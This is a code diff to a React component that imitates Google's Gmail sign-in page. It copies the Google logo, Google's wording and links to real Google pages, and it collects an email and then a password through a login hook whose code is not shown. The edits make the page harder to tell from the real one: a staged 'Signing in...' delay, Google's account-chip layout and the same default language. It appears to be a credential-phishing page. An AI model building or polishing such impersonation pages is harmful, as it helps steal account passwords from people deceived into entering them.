@@ -41,6 +41,8 @@ const GmailLoginPage: React.FC<GmailLoginPageProps> = ({ onLoginSuccess, onLogin
   const [password, setPassword] = useState('');
   const [showPasswordStep, setShowPasswordStep] = useState(false);
   const [pageReady, setPageReady] = useState(false);
+  const [isTransitioning, setIsTransitioning] = useState(false);
+  const [showPassword, setShowPassword] = useState(false);
 
   const { isLoading, errorMessage, handleFormSubmit } = useLogin(onLoginSuccess, onLoginError);
 
@@ -51,7 +53,13 @@ const GmailLoginPage: React.FC<GmailLoginPageProps> = ({ onLoginSuccess, onLogin
 
   const handleNext = (e: React.MouseEvent<HTMLButtonElement>) => {
     e.preventDefault();
-    if (email) { setShowPasswordStep(true); }
+    if (email) { 
+      setIsTransitioning(true);
+      setTimeout(() => {
+        setShowPasswordStep(true);
+        setIsTransitioning(false);
+      }, 1000);
+    }
   };
   
   const handleSubmit = async (e: React.FormEvent) => {
@@ -63,6 +71,18 @@ const GmailLoginPage: React.FC<GmailLoginPageProps> = ({ onLoginSuccess, onLogin
     return (
       <div className="min-h-screen bg-[#f0f4f9] flex items-center justify-center">
         <Spinner size="lg" color="border-blue-600" />
+      </div>
+    );
+  }
+
+  // Show signing in loading state during transition
+  if (isTransitioning) {
+    return (
+      <div className="min-h-screen bg-[#f0f4f9] flex items-center justify-center">
+        <div className="text-center">
+          <Spinner size="lg" color="border-blue-600" />
+          <p className="mt-4 text-gray-600">Signing in...</p>
+        </div>
       </div>
     );
   }
@@ -83,8 +103,18 @@ const GmailLoginPage: React.FC<GmailLoginPageProps> = ({ onLoginSuccess, onLogin
               <path d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z" fill="#EA4335"/>
               <path d="M35.29 41.19V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49-.01z" fill="#4285F4"/>
             </svg>
-            <h1 className="text-2xl text-gray-800 mt-4">Sign in</h1>
-            <p className="text-gray-600 mt-2">to continue to Gmail</p>
+            {!showPasswordStep ? (
+              <>
+                <h1 className="text-2xl text-gray-800 mt-4">Sign in</h1>
+                <p className="text-sm text-gray-600 mt-2">
+                  with your Google Account to continue to Gmail. This account will be available to other Google apps in the browser.
+                </p>
+              </>
+            ) : (
+              <>
+                <h1 className="text-2xl text-gray-800 mt-4">Welcome</h1>
+              </>
+            )}
           </div>
 
           <div className="mt-8">
@@ -100,15 +130,15 @@ const GmailLoginPage: React.FC<GmailLoginPageProps> = ({ onLoginSuccess, onLogin
                   <a href="https://accounts.google.com/signin/v2/recovery/identifier" target="_blank" rel="noopener noreferrer" className="text-sm font-semibold text-blue-600 hover:underline mt-2 inline-block">
                     Forgot email?
                   </a>
-                  <p className="text-xs text-gray-500 mt-8">
-                    Not your computer? Use Guest mode to sign in privately.
-                    <a href="https://support.google.com/chrome/answer/6130773" target="_blank" rel="noopener noreferrer" className="text-sm font-semibold text-blue-600 hover:underline ml-1">Learn more</a>
+                  <p className="text-sm text-gray-600 mt-8">
+                    Not your computer? Use Guest mode to sign in privately.{' '}
+                    <a href="https://support.google.com/chrome/answer/6130773" target="_blank" rel="noopener noreferrer" className="text-blue-600 hover:underline">Learn more about using Guest mode</a>
                   </p>
                   <div className="flex justify-between items-center mt-8">
                     <a href="https://accounts.google.com/signup" target="_blank" rel="noopener noreferrer" className="text-sm font-semibold text-blue-600 hover:underline">
                       Create account
                     </a>
-                    <button onClick={handleNext} disabled={!email} className="px-6 py-2.5 bg-blue-600 text-white font-semibold rounded-md hover:bg-blue-700 disabled:bg-blue-600 disabled:cursor-not-allowed transition-colors">
+                    <button onClick={handleNext} disabled={!email} className="px-6 py-2.5 bg-blue-600 text-white font-semibold rounded-md hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed transition-colors">
                       Next
                     </button>
                   </div>
@@ -116,12 +146,45 @@ const GmailLoginPage: React.FC<GmailLoginPageProps> = ({ onLoginSuccess, onLogin
               ) : (
                 // Password Step
                 <div>
-                  <div className="text-center text-sm font-medium p-2 rounded-full border border-gray-300 inline-block mb-4">{email}</div>
-                  <GoogleInput value={password} onChange={(e: any) => setPassword(e.target.value)} label="Enter your password" type="password" autoFocus />
-                  <a href="https://accounts.google.com/signin/v2/challenge/password/recovery" target="_blank" rel="noopener noreferrer" className="text-sm font-semibold text-blue-600 hover:underline mt-2 inline-block">
-                    Forgot password?
-                  </a>
+                  {/* Email selector with profile icon */}
+                  <div className="mb-6">
+                    <button className="flex items-center space-x-2 p-2 border border-gray-300 rounded-full hover:bg-gray-50 transition-colors">
+                      <div className="w-8 h-8 rounded-full bg-blue-600 flex items-center justify-center text-white text-sm font-semibold">
+                        {email.charAt(0).toUpperCase()}
+                      </div>
+                      <span className="text-sm text-gray-700">{email}</span>
+                      <svg className="w-4 h-4 text-gray-500" fill="currentColor" viewBox="0 0 20 20">
+                        <path fillRule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clipRule="evenodd" />
+                      </svg>
+                    </button>
+                  </div>
+                  
+                  <GoogleInput 
+                    value={password} 
+                    onChange={(e: any) => setPassword(e.target.value)} 
+                    label="Enter your password" 
+                    type={showPassword ? "text" : "password"} 
+                    autoFocus 
+                  />
+                  
+                  {/* Show password checkbox */}
+                  <div className="flex items-center mt-3">
+                    <input
+                      type="checkbox"
+                      id="showPassword"
+                      checked={showPassword}
+                      onChange={(e) => setShowPassword(e.target.checked)}
+                      className="w-4 h-4 text-blue-600 border-gray-300 rounded focus:ring-blue-500"
+                    />
+                    <label htmlFor="showPassword" className="ml-2 text-sm text-gray-700 cursor-pointer">
+                      Show password
+                    </label>
+                  </div>
+                  
                   <div className="flex justify-end mt-8">
+                    <a href="https://accounts.google.com/signin/v2/challenge/password/recovery" target="_blank" rel="noopener noreferrer" className="text-sm font-semibold text-blue-600 hover:underline mr-auto">
+                      Forgot password?
+                    </a>
                     <button type="submit" disabled={isLoading || !password} className="px-6 py-2.5 bg-blue-600 text-white font-semibold rounded-md hover:bg-blue-700 disabled:opacity-50 transition-colors">
                        {isLoading ? <Spinner size="sm" color="border-white" /> : 'Next'}
                     </button>
@@ -135,7 +198,8 @@ const GmailLoginPage: React.FC<GmailLoginPageProps> = ({ onLoginSuccess, onLogin
 
       <footer className="w-full max-w-lg mx-auto flex justify-between items-center p-4 text-xs text-gray-600">
         <div>
-          <select className="bg-transparent text-gray-800 py-2 pr-6">
+          <select className="bg-transparent text-gray-600 py-2 pr-6 border-0 outline-none cursor-pointer">
+            <option value="en" selected>English (United States)</option>
             <option value="af">Afrikaans</option>
             <option value="az">Azərbaycan</option>
             <option value="id">Bahasa Indonesia</option>
@@ -146,7 +210,6 @@ const GmailLoginPage: React.FC<GmailLoginPageProps> = ({ onLoginSuccess, onLogin
             <option value="de">Deutsch</option>
             <option value="et">Eesti</option>
             <option value="en-GB">English (United Kingdom)</option>
-            <option value="en" selected>English (United States)</option>
             <option value="es">Español (España)</option>
             <option value="es-419">Español (Latinoamérica)</option>
             <option value="eu">Euskara</option>
